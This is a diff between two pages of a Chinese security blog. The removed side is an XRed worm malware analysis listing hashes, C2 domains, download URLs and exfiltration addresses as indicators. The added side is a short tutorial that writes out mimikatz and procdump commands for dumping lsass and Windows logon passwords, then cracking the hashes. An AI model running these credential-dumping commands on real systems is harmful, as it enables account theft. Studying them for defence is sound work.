@@ -16,34 +16,28 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一、样本信息恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：    文件名 000000.xlsm    MD5 e566fc53051035e1e6fd0ed1823de0f9   SHA256 8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bb">
+    <meta name="description" content="事由翻看以前的文件夹突然看到mimikatz，突然想到之前遇到过一个挖矿的传染病毒，python2.7写的，几千行太多了，当时就懒得仔细看，毕竟都是源代码。好像里面有这个模块，就随便写了写，mimikatz主要也是用于内网渗透，密码收集的吧   mimikatz简介mimikatz是法国人Benjamin Delpy编写的一款轻量级的调试工具，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XRed蠕虫病毒分析">
-<meta property="og:url" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="使用mimikatz获取账号密码">
+<meta property="og:url" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/index.html">
 <meta property="og:site_name" content="Demo_博客">
-<meta property="og:description" content="一、样本信息恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：    文件名 000000.xlsm    MD5 e566fc53051035e1e6fd0ed1823de0f9   SHA256 8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bb">
+<meta property="og:description" content="事由翻看以前的文件夹突然看到mimikatz，突然想到之前遇到过一个挖矿的传染病毒，python2.7写的，几千行太多了，当时就懒得仔细看，毕竟都是源代码。好像里面有这个模块，就随便写了写，mimikatz主要也是用于内网渗透，密码收集的吧   mimikatz简介mimikatz是法国人Benjamin Delpy编写的一款轻量级的调试工具，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image004.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image006.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image008.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image010.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image012.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image014.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image016.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image017.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image019.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image021.png">
-<meta property="og:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image022.png">
-<meta property="article:published_time" content="2022-05-16T06:26:25.000Z">
-<meta property="article:modified_time" content="2022-05-16T06:31:26.806Z">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524140354511.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524135921116.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图%202022-05-24%20095447.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524102018844.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图%202022-05-24%20103347.png">
+<meta property="og:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/屏幕截图%202022-05-24%20103717.png">
+<meta property="article:published_time" content="2022-05-24T08:20:16.000Z">
+<meta property="article:modified_time" content="2022-05-24T08:21:33.133Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="XRed">
+<meta property="article:tag" content="mimikatz">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png">
+<meta name="twitter:image" content="http://example.com/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524140354511.png">
   
   
-  <title>XRed蠕虫病毒分析 - Demo_博客</title>
+  <title>使用mimikatz获取账号密码 - Demo_博客</title>
 
   <link  rel="stylesheet" href="https://unpkg.com/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -201,7 +195,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="XRed蠕虫病毒分析">
+            <span class="h2" id="subtitle" title="使用mimikatz获取账号密码">
               
             </span>
 
@@ -211,8 +205,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-05-16 14:26" pubdate>
-        2022年5月16日 下午
+      <time datetime="2022-05-24 16:20" pubdate>
+        2022年5月24日 下午
       </time>
     </span>
   
@@ -222,7 +216,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.1k 字
+      1.2k 字
     </span>
   
 
@@ -231,7 +225,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      18 分钟
+      11 分钟
     </span>
   
 
@@ -260,118 +254,42 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">XRed蠕虫病毒分析</h1>
+            <h1 style="display: none">使用mimikatz获取账号密码</h1>
             
             <div class="markdown-body">
-              <h2 id="一、样本信息"><a href="#一、样本信息" class="headerlink" title="一、样本信息"></a>一、样本信息</h2><p>恶意文件为excel表格文件，文件名为“000000.xlsm”，MD5值为e566fc53051035e1e6fd0ed1823de0f9。详情如下表：</p>
-<table>
-<thead>
-<tr>
-<th>文件名</th>
-<th>000000.xlsm</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>MD5</td>
-<td>e566fc53051035e1e6fd0ed1823de0f9</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>8e574b4ae6502230c0829e2319a6c146aebd51b7008bf5bbfb731424d7952c15</td>
-</tr>
-<tr>
-<td>文件大小</td>
-<td>18,387 字节</td>
-</tr>
-<tr>
-<td>病毒类型</td>
-<td>HEUR:Trojan-Downloader.Script.Generic</td>
-</tr>
-</tbody></table>
-<p>经初步分析该文档属于伪装成“Synaptics触摸板驱动程序”的Xred蠕虫病毒产生的存在恶意宏代码的Excel传播文档。该病毒曾于2020年初较为活跃，是具备远程控制、信息窃取能力的感染型病毒，可以感染本地EXE文件及xlsx电子表格文件，病毒可通过文件分享和U盘、移动硬盘等媒介传播。据此，安全人员判定上述上传恶意文件的主机已经遭受感染，但在流量监控过程中并未发现该病毒主程序，因此从相关威胁情报中搜集到了源EXE格式病毒。Xred病毒详情如下：</p>
-<table>
-<thead>
-<tr>
-<th>文件名</th>
-<th>Synaptics.exe</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>MD5</td>
-<td>13358cfb6040fd4b2dba262f209464de</td>
-</tr>
-<tr>
-<td>SHA256</td>
-<td>72daa031ce52468fce5cdab85b21b18f1211b8804bc23c6e6ae8c24e868c4866</td>
-</tr>
-<tr>
-<td>文件大小</td>
-<td>771,584 字节</td>
-</tr>
-<tr>
-<td>病毒类型</td>
-<td>Backdoor.Win32.DarkKomet.hqxy</td>
-</tr>
-</tbody></table>
-<h2 id="二、样本分析"><a href="#二、样本分析" class="headerlink" title="二、样本分析"></a>二、样本分析</h2><p>捕获的Excel文档内容均为空，包含恶意宏代码，打开后会自动运行。篡改Word和Excel组件的宏设置，启用所有宏，并通过公有云盘下载并执行Synaptics.exe病毒。目前所有的下载链接均已失效。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image002.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>修改宏设置</center>
+              <h3 id="事由"><a href="#事由" class="headerlink" title="事由"></a>事由</h3><p>翻看以前的文件夹突然看到mimikatz，突然想到之前遇到过一个挖矿的传染病毒，python2.7写的，几千行太多了，当时就懒得仔细看，毕竟都是源代码。好像里面有这个模块，就随便写了写，mimikatz主要也是用于内网渗透，密码收集的吧</p>
+<p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524140354511.png" srcset="/img/loading.gif" lazyload alt="image-20220524140354511"></p>
+<p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524135921116.png" srcset="/img/loading.gif" lazyload alt="image-20220524135921116"></p>
+<h3 id="mimikatz简介"><a href="#mimikatz简介" class="headerlink" title="mimikatz简介"></a>mimikatz简介</h3><p>mimikatz是法国人Benjamin Delpy编写的一款轻量级的调试工具，在内网渗透过程中，它多数时候是作为一款抓取用户口令的工具，属于内网渗透必备工具之一，被很多人称之为密码抓取神器。然而Mimikatz其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash传递，甚至伪造域管理凭证令牌等诸多功能。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a></p>
+<h3 id="使用mimikatz直接获取账号密码"><a href="#使用mimikatz直接获取账号密码" class="headerlink" title="使用mimikatz直接获取账号密码"></a>使用mimikatz直接获取账号密码</h3><p>mimikatz读取明文密码和hash时需要管理员权限</p>
+<p>然后依次执行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">privilege::debug                <span class="hljs-regexp">//</span>提升至debug权限<br>sekurlsa::logonpasswords        <span class="hljs-regexp">//</span>抓取密码<br><br>或者<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt <span class="hljs-keyword">exit</span>          <span class="hljs-regexp">//</span>结果输出到pssword.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image004.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>远程下载并执行病毒</center>
+<img src="屏幕截图 2022-05-24 095447.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-05-24 095447" style="zoom: 67%;" />
 
-<p>Xred病毒由Delph编写，无壳，自身伪装成Synaptics触摸板驱动程序。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image006.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>PE详情</center>
+<p>Windows10比较麻烦，执行命令后需要将相应SHA1值解密，获取密码</p>
+<p>（网上有人说可以通过修改注册表的方式抓取明文，尝试后发现显示 _TBAL_并没有显示明文密码，不知道哪里出的问题）</p>
+<p>![屏幕截图 2022-05-24 101038](屏幕截图 2022-05-24 101038.png)</p>
+<p>解码网站：<a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
+<p><img src="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/image-20220524102018844.png" srcset="/img/loading.gif" lazyload alt="image-20220524102018844"></p>
+<h3 id="Procdump-mimikatz配合抓取密码"><a href="#Procdump-mimikatz配合抓取密码" class="headerlink" title="Procdump+mimikatz配合抓取密码"></a>Procdump+mimikatz配合抓取密码</h3><p>mimikatz容易被杀软查杀，而<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>是微软官方的应用程序，文件本身不会被查杀</p>
+<p>但测试过程中执行相应命令，Microsoft Defender报毒</p>
+<p>![屏幕截图 2022-05-24 103254](屏幕截图 2022-05-24 103254-16533604085481.png)</p>
+<p>所以之后还要重点考虑<strong>mimikatz的免杀策略</strong>，网上有很多相应的文章</p>
+<p>采用Procdump获取内存文件lsass.exe进程 (它用于本地安全和登陆策略) 中存储的登录密码并转储到lsass.dmp文件中，之后我们就可以使用mimikatz去读取lsass.dmp获取到密码</p>
+<p>生成转储文件lsass.dmp</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image008.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>伪装成驱动程序</center>
+<img src="屏幕截图 2022-05-24 103347.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-05-24 103347" style="zoom: 80%;" />
 
-<p>该病毒通过感染指定位置（Desktop、Documents、Downloads）的32位的“.exe”后缀文件与“.xlsx”后缀文件，使其恶意代码可以通过文件共享大量传播但不会导致系统明显卡顿。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image010.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>指定位置</center>
+<p>mimikatz读取转储文件</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>被感染的文件被执行时，会执行恶意逻辑，包括释放伪装名为“Synaptics.exe”的文件常驻系统，进行远程控制，回传窃取的敏感信息等恶意行为。主要功能逻辑如下图所示：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image012.png" srcset="/img/loading.gif" lazyload alt="https://pc1.gtimg.com/guanjia/images/9b/83/9b837e056017f499ccb79ef4daa6213d.png"></p>
-<center>主要功能逻辑</center>
+<img src="屏幕截图 2022-05-24 103717.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-05-24 103717" style="zoom:80%;" />
 
-<p>被感染的可执行文件体积增量约为753KB，包含一个名为“EXERESX”的资源，该资源是原始正常的程序。“EXERESX”资源会在宿主文件运行时被释放到当前目录并设置隐藏属性后执行。添加“ ._cache_”前缀拼接文件名。如下图所示：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image014.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image016.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>被感染的文件与原文件对比</center>
-
-<p>该病毒释放并加载名为“KBHKS”的动态库资源，通过设置相关钩子消息以记录键盘输入信息及其窗口信息等， Hook代码关键逻辑如下：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image017.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>Hook钩子</center>
-
-<p>病毒使用“XLSM”资源感染xlsx后缀文件，并将“.xlsx”后缀改为“.xlsm”。修改office组件设置以及xlsm后缀目的为了能够自动静默启用宏。如下图所示：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image019.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>感染xlsx文件</center>
-
-<p>病毒回连地址，公有云盘下载地址及敏感信息接收邮箱见下图：</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image021.png" srcset="/img/loading.gif" lazyload alt="img"> <center>回连字符串</center></p>
-<p>具有基础的远程控制功能，包括执行CMD命令、屏幕截图、打印目录、下载文件、删除文件等。功能代码如下图所示。</p>
-<p><img src="/2022/05/16/XRed%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/clip_image022.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<center>远控功能</center>
-
-
-
-<h2 id="三、IOCs"><a href="#三、IOCs" class="headerlink" title="三、IOCs"></a>三、IOCs</h2><p><strong>MD5：</strong></p>
-<p>e566fc53051035e1e6fd0ed1823de0f9</p>
-<p>13358cfb6040fd4b2dba262f209464de</p>
-<p>备注：因为被感染文件一直都是变化的，MD5值不确定，只列举了两个得到的样本</p>
-<p><strong>C2 &amp; URL：</strong></p>
-<p>xred.mooo.com</p>
-<p>freedns.afraid.org</p>
-<p>docs.google.com&#x2F;uc?id&#x3D;0BxsMXGfPIZfSVlVsOGlEVGxuZVk&amp;export&#x3D;download</p>
-<p><a target="_blank" rel="noopener" href="http://www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1">www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1</a></p>
-<p>xred.site50.net&#x2F;syn&#x2F;Synaptics.rar</p>
-<p><strong>邮箱地址：</strong></p>
-<p><a href="mailto:&#x78;&#x72;&#101;&#x64;&#x6c;&#x69;&#x6e;&#101;&#x31;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x78;&#x72;&#101;&#x64;&#x6c;&#x69;&#x6e;&#101;&#x31;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a></p>
-<p><a href="mailto:&#120;&#x72;&#x65;&#100;&#108;&#x69;&#x6e;&#x65;&#50;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#120;&#x72;&#x65;&#100;&#108;&#x69;&#x6e;&#x65;&#50;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a></p>
-<p><a href="mailto:&#x78;&#x72;&#x65;&#x64;&#x6c;&#105;&#x6e;&#101;&#51;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x78;&#x72;&#x65;&#x64;&#x6c;&#105;&#x6e;&#101;&#51;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a></p>
-<h2 id="四、处置建议"><a href="#四、处置建议" class="headerlink" title="四、处置建议"></a>四、处置建议</h2><p>（1）立即对感染病毒的机器进行断网处理，避免进一步扩散。</p>
-<p>（2）对已感染病毒的电脑，进行全盘查杀，修复被感染的文件。</p>
+<p>然后就可以解码得到的SHA1值</p>
+<p>工具很强大不搞渗透简单了解一下算了</p>
 
             </div>
             <hr>
@@ -381,7 +299,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a>
+                      <a class="hover-with-bg" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
                     
                   </div>
                 
@@ -389,7 +307,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/XRed/">XRed</a>
+                      <a class="hover-with-bg" href="/tags/mimikatz/">mimikatz</a>
                     
                   </div>
                 
@@ -406,18 +324,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/05/17/Emotet%E7%9A%84%E6%96%B0%E5%BD%A2%E5%BC%8F-Link/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Emotet的新形式-Link</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/05/13/VBE%E3%80%81PowerShell%E5%92%8CJavaScript%E6%9C%A8%E9%A9%AC/">
-                        <span class="hidden-mobile">VBE、PowerShell和JavaScript木马</span>
+                      <a href="/2022/05/20/PE%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/">
+                        <span class="hidden-mobile">PE文件数字签名</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
